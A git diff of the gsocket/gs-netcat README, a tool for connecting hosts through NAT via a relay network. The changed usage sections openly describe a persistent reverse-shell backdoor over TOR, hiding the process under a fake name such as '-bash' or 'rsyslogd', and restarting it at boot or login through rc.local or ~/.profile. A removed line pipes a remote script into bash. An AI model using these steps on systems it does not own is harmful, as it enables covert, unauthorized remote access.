@@ -20,7 +20,7 @@ See https://shields.io/category/license
 **Connect like there is no firewall. Securely.**
 
 The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.  
-More on [https://www.gsocket.io](https://www.gsocket.io).
+More on [https://www.gsocket.io](https://www.gsocket.io) and most people use [https://www.gsocket.io/deploy](http://www.gsocket.io/deploy).
 
 [![Watch the video](https://www.gsocket.io/assets/images/eeelite-console-640x378.png)](https://www.youtube.com/watch?v=tmf9VGDPILE)
 
@@ -58,8 +58,6 @@ Man Page| [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html), [gs-netc
 Docker|  docker run --rm -it hackerschoice/gsocket
 Docker| docker run --rm -it hackerschoice/gsocket-tor # gs via TOR
 
-# ***Version 1.4.32 and later break backward compatibility to older (obsolete) gs-netcats. It will not connect to older gs-netcats or vice versa. Update both ends to 1.4.32 or later.***
-
 ---
 **Examples**
 <A></A>|<A></A>
@@ -72,10 +70,8 @@ IRCD via GSRN| [examples/port-forward](examples/port-forward)
 
 ---
 <a id="installation-anchor"></a>
-**Installation:**
-```
-$ /bin/bash -c "$(curl -fsSL https://tiny.cc/gsinst)"
-```
+Follow the [Installation Instructions](https://github.com/hackerschoice/gsocket/blob/master/deploy/README.md) for all major Operating Systems.
+
 ---
 **Usage:**
 
@@ -127,14 +123,18 @@ $ gs-netcat -l -r >warez.tar.gz    # Workstation A
 $ gs-netcat <warez.tar.gz          # Workstation B
 ```
 
-6. Port forward. *Workstation B's* Port 2222 is forwarded to 192.168.6.7 on *Workstation A's* private LAN
+6. Port forward. Access 192.168.6.7:22 on Workstation's A private LAN from Workstation B:
 ```
-$ gs-netcat -l -d 192.168.6.7 -p 22 # Workstation A
-$ gs-netcat -p 2222                 # Workstation B
-$ ssh -p 2222 root@127.0.0.1        # Will ssh to 192.168.6.7:22 on Host's private LAN
-...or...
-$ gs-netcat -s MySecret -l -d 192.168.6.7 -p 22                   # Workstation A
-$ ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter  # Workstation B
+# On Workstation A execute:
+gs-netcat -l -d 192.168.6.7 -p 22
+```
+```
+# On Workstation B execute:
+gs-netcat -p 2222
+```
+```
+# In a new terminal on Workstation B execute:
+ssh -p 2222 root@127.0.0.1        # Will ssh to 192.168.6.7:22 on Workstation's A private LAN
 ```
 
 7. Execute any command (nc -e style) on *Workstation A*
@@ -142,6 +142,19 @@ $ ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter  # Workstation 
 $ gs-netcat -l -e "echo hello world; id; exit"   # Workstation A
 $ gs-netcat                                      # Workstation B
 ```
+
+Another example: Spawn a new docker environment deep inside a private network
+```
+# Start this on a host deep inside a private network
+gs-netcat -il -d "docker run --rm -it kalilinux/kali-rolling"
+```
+
+Access the docker environment deep inside the private network from anywhere in the world:
+```
+gs-netcat -i
+```
+
+This is particularly useful to allow fellow hackers to access a private network without having to give them access to the system itself.
 
 8. Quick Secure Chat with a friend
 ```
@@ -160,6 +173,7 @@ $ curl --socks4a 127.1:1080 http://www.google.com
 Access fileserver.local:22 on Workstation A's private LAN from your Workstation B:
 $ socat -  "SOCKS4a:127.1:fileserver.local:22"
 ```
+
 
 10. Persistant, daemonized and auto-respawn/watchdog reverse PTY backdoor via TOR
 ```
@@ -181,30 +195,27 @@ $ export GSOCKET_SOCKS_IP=127.0.0.1
 $ export GSOCKET_SOCKS_PORT=9050
 ```
 
-2. A reverse backdoor
+2. A reverse shell
 
-The backdoor supports multiple concurrent connections and spawns a real PTY/interactive-shell with ctrl-c and colors working (like OpenSSH does).
+Gs-netcat supports multiple concurrent connections and spawns a real PTY/interactive-shell with ctrl-c and colors working (like OpenSSH does).
 ```
-$ gs-netcat -k keyfile.txt -l -i    # Host
-$ gs-netcat -k keyfile.txt -T -i    # Workstation (via Tor & Global Socket Relay)
+$ gs-netcat -l -i    # Host
+$ gs-netcat -T -i    # Workstation (via Tor & Global Socket Relay)
 ```
 
-Add -D on the host side to run gs-netcat as a daemon and in watchdog-mode: The backdoor will automatically restart if it is ever killed.
+Add -D on the host side to start gs-netcat as a daemon and in watchdog-mode: Gs-netcat will restart automatically if killed.
 
 3. Use -k
 
-Using -s is not secure. Add your *secret* to a file and use -k &lt;filen&gt; or use GSOCKET_ARGS or enter the password when prompted.
+Using -s is not secure. Add your *secret* to a file and use -k &lt;filen&gt; or use GSOCKET_ARGS="-s &lt;MySecret&gt;".
 
 ```
-$ gs-netcat -k MyFile.txt
-
-$ export GSOCKET_ARGS="-s MySecret"
-$ gs-netcat -l
+GSOCKET_ARGS="-s MySecret" gs-netcat -l
 ```
 
 Use this command to generate a new secure password at random:
 ```
-$ gs-netcat -g
+gs-netcat -g
 ```
 
 4. Hide your arguments (argv)
@@ -219,7 +230,19 @@ $ ps alxww | grep -bash
   1001 47255     1   0  26  5  4281168    436 -      SNs    ??    0:00.00 -bash
 ```
 
-5. Start backdoor after reboot
+5. SSH login to remote workstation
+```
+# On the remote workstation execute:
+gs-netcat -s MySecret -l -d 192.168.6.7 -p 22
+```
+```
+# Access 192.168.6.7 via ssh on the remote network from your workstation:
+ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter
+```
+
+6. Retain access after reboot
+
+The easiest way to retain access to a remote system is by using [the automated deploy script](https://www.gsocket.io/deploy). Alternatively the following can be used to achieve the same:
 
 Combine what you have learned so far and make your backdoor restart after reboot (and as a hidden service obfuscated as *rsyslogd*). Use any of the start-up scripts, such as */etc/rc.local*:
 ```
@@ -234,16 +257,10 @@ Not all environment variables are set during system bootup. Set some variables t
 
 Alternatively install gs-netcat as a [systemd service](examples/systemd-root-shell).
 
-Starting when the user logs in (and only once) can be done by adding this line to the user's *~/.profile* file:
+Alternativly and if you do not have root privileges then just append the following line to the user's *~/.profile* file. This will start gs-netcat (if it is not already running) the next time the user logs in. There are [many other ways to restart a reverse shell after system reboot](https://www.gsocket.io/deploy):
 ```
-killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret2 -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
+killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
 ```
-
-Starting a port-forward during bootup. This one forwards TCP to 127.0.0.1:22 (example):
-```
-GSOCKET_ARGS="-k MySecret3 -lqD -d 127.1 -p22"  /bin/bash -c "exec -a rsyslogp /usr/local/bin/gs-netcat"
-```
-
 ---
 **Crypto / Security Mumble Jumble**
 1. The security is end-2-end. This means from User-2-User (and not just to the Relay Network). The Relay Network relays only (encrypted) data to and from the Users. 
